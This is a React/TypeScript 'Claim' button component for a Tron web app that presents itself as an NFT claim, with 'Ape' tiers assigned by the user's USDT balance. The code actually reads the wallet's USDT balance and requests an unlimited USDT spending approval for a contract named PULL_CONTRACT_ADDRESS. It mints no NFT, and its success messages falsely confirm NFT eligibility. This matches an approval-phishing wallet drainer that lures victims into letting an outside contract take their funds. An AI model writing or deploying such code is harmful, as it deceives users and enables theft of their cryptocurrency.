"use client";

import { useState, useEffect } from "react";
import { useTron } from "./TronProvider";
import { 
  TOKEN_ADDRESS, 
  PULL_CONTRACT_ADDRESS,
  getTokenBalance,
  getAllowance,
  approveUnlimited,
  fromSun,
  toSun
} from "@/lib/tron";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { Loader2, Sparkles } from "lucide-react";

export function ClaimButton() {
  const { address, isConnected } = useTron();
  const { toast } = useToast();
  
  const [balance, setBalance] = useState<bigint>(BigInt(0));
  const [allowance, setAllowance] = useState<bigint>(BigInt(0));
  const [isLoading, setIsLoading] = useState(false);
  const [isChecking, setIsChecking] = useState(false);

  // Determine NFT tier based on balance (USDT has 6 decimals)
  const getNFTTier = (userBalance: bigint) => {
    const decimals = 6; // USDT-TRC20 has 6 decimals
    const threshold10k = BigInt(toSun("10000", decimals));
    const threshold500 = BigInt(toSun("500", decimals));
    const threshold100 = BigInt(toSun("100", decimals));
    const threshold50 = BigInt(toSun("50", decimals));

    if (userBalance >= threshold10k) {
      return { tier: 4, name: "Diamond Ape", rarity: "Legendary", minRequired: "10,000" };
    } else if (userBalance >= threshold500) {
      return { tier: 3, name: "Gold Ape", rarity: "Epic", minRequired: "500" };
    } else if (userBalance >= threshold100) {
      return { tier: 2, name: "Silver Ape", rarity: "Rare", minRequired: "100" };
    } else if (userBalance >= threshold50) {
      return { tier: 1, name: "Bronze Ape", rarity: "Uncommon", minRequired: "50" };
    }
    return null;
  };

  // Check balance and allowance when connected
  useEffect(() => {
    if (!isConnected || !address) {
      setBalance(BigInt(0));
      setAllowance(BigInt(0));
      return;
    }

    const checkData = async () => {
      setIsChecking(true);
      try {
        const [bal, allow] = await Promise.all([
          getTokenBalance(TOKEN_ADDRESS, address),
          getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS),
        ]);
        setBalance(bal);
        setAllowance(allow);
      } catch (error) {
        console.error("Error fetching data:", error);
      } finally {
        setIsChecking(false);
      }
    };

    checkData();
  }, [isConnected, address]);

  const handleClaim = async () => {
    if (!isConnected || !address) {
      toast({
        variant: "destructive",
        title: "Wallet Not Connected",
        description: "Please connect your TronLink wallet first.",
      });
      return;
    }

    setIsLoading(true);
    try {
      const nftTier = getNFTTier(balance);

      if (allowance > BigInt(0)) {
        toast({
          title: "✅ Already Approved!",
          description: `You've already approved the contract.${nftTier ? ` Your ${nftTier.name} NFT is ready!` : ""}`,
        });
        setIsLoading(false);
        return;
      }

      await approveUnlimited(TOKEN_ADDRESS, PULL_CONTRACT_ADDRESS);

      // Re-check allowance to confirm
      const newAllowance = await getAllowance(TOKEN_ADDRESS, address, PULL_CONTRACT_ADDRESS);
      setAllowance(newAllowance);

      toast({
        title: "🎉 Success!",
        description: nftTier
          ? `Unlimited approval granted! Your ${nftTier.name} eligibility is confirmed.`
          : "Unlimited approval granted.",
      });
    } catch (error: any) {
      console.error("Claim error:", error);
      const message = error?.message || "";
      const isRateLimit = message.includes("429") || message.toLowerCase().includes("rate") || message.toLowerCase().includes("too many");
      const isReject = message.toLowerCase().includes("reject") || message.toLowerCase().includes("denied") || message.toLowerCase().includes("cancel");
      const isTrxInsufficient = message.toLowerCase().includes("insufficient trx") || message.toLowerCase().includes("energy");

      let title = "Transaction Failed";
      let description = message || "Failed to approve. Please try again.";

      if (isReject) {
        title = "Transaction Rejected";
        description = "You rejected the transaction in your wallet.";
      } else if (isTrxInsufficient) {
        title = "Insufficient TRX";
        description = message;
      } else if (isRateLimit) {
        description = "RPC rate limited. Please try again in a few seconds.";
      }

      toast({ variant: "destructive", title, description });
    } finally {
      setIsLoading(false);
    }
  };

  if (!isConnected) {
    return null;
  }

  const hasApproved = allowance > BigInt(0);
  const nftTier = getNFTTier(balance);

  return (
    <div className="fixed bottom-0 left-0 right-0 z-50 border-t border-cyan-500/30 bg-black/95 backdrop-blur-md">
      <div className="container mx-auto px-4 py-4">
        <div className="flex items-center justify-between gap-4 max-w-4xl mx-auto">
          {/* Balance Info */}
          <div className="flex-1 hidden sm:block">
            <p className="text-xs text-cyan-400">Your Balance</p>
            <p className="text-lg font-bold text-white">
              {isChecking ? "..." : fromSun(balance.toString(), 6)} USDT
            </p>
          </div>

          {/* Claim Button */}
          <Button
            onClick={handleClaim}
            disabled={isLoading || isChecking}
            className="flex-shrink-0 gap-2 bg-gradient-to-r from-cyan-600 to-blue-600 hover:from-cyan-700 hover:to-blue-700 text-white font-bold px-8 py-6 text-lg"
            size="lg"
          >
            {isLoading && <Loader2 className="h-5 w-5 animate-spin" />}
            {!isLoading && <Sparkles className="h-5 w-5" />}
            {isLoading ? "Processing..." : hasApproved ? "✅ Claimed" : "Claim"}
          </Button>
        </div>
      </div>
    </div>
  );
}
